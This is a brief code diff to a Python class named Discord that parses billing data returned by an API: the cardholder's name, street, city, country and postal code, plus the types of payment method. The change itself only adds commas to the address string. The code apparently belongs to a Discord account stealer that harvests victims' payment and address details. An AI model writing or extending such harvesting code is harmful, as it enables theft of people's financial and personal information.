@@ -93,7 +93,7 @@ class Discord:
             if req2:
                 parsed = json.loads(req2.text.replace("[", "").replace("]", ""))
                 self.cart_name.append(parsed["billing_address"]["name"])
-                self.addres =parsed["billing_address"]["line_1"] + " " + parsed["billing_address"]["city"] +  " " +parsed["billing_address"]["country"] + " " + parsed["billing_address"]["postal_code"]
+                self.addres =parsed["billing_address"]["line_1"] + ", " + parsed["billing_address"]["city"] +  ", " +parsed["billing_address"]["country"] + ", " + parsed["billing_address"]["postal_code"]
                 for method in req2.json():
                     if method["type"] == 1:
                         self.billings.append("💳")
